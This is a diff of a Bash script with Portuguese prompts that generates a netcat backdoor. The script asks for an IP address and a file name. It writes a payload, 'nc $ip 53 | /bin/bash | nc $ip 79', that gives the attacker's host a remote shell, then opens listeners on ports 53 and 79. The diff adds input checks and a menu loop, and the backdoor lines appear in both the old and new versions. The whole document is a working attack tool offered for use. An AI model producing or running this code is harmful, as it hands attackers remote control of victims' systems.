@@ -1,7 +1,7 @@
 #!/bin/bash
-# Version: 1.0
-# Developer: Derxs 
+Menu(){
 clear
+sleep 2
 echo "
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMMMMM        MMMMMMMMMMMM
@@ -38,15 +38,31 @@ MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 "
 echo -n "[+] Digite o seu IP: "
 read ip
-echo -n "[+] Digite o nome para a backdoor: "
-read nome
-sudo echo "#!/bin/bash" >> $nome.sh
-sudo echo "nc $ip 53 | /bin/bash | nc $ip 79" >> $nome.sh
-sudo chmod 777 $nome.sh
-clear
-echo "[+] Backdoor criada com sucesso!"
-sleep 2
-sudo echo nc -l -n -p 79 -vv >> ~/.bashrc
-sudo gnome-terminal
-sudo sed -i '/nc -l -n -p 79/d' ~/.bashrc
-sudo nc -l -n -p 53 -vv
+if [ "$ip" == "" ];
+  then
+	  echo "[!] Você precisa digitar o seu número de IP!"
+	  sleep 3
+	  Menu
+else
+	echo -n "[+] Digite o nome para a backdoor: "
+	read nome
+	if [ "$nome" == "" ];
+	  then
+		  echo "[!] Você precisa digitar um nome!"
+		  sleep 3
+		  Menu
+	else
+		  sudo echo "#!/bin/bash" >> $nome.sh
+		  sudo echo "nc $ip 53 | /bin/bash | nc $ip 79" >> $nome.sh
+		  sudo chmod 777 $nome.sh
+		  clear
+		  echo "[+] Backdoor criada com sucesso!"
+		  sleep 2
+		  sudo echo nc -l -n -p 79 -vv >> ~/.bashrc
+		  sudo gnome-terminal
+		  sudo sed -i '/nc -l -n -p 79/d' ~/.bashrc
+		  sudo nc -l -n -p 53 -vv
+	 fi
+fi
+}
+Menu
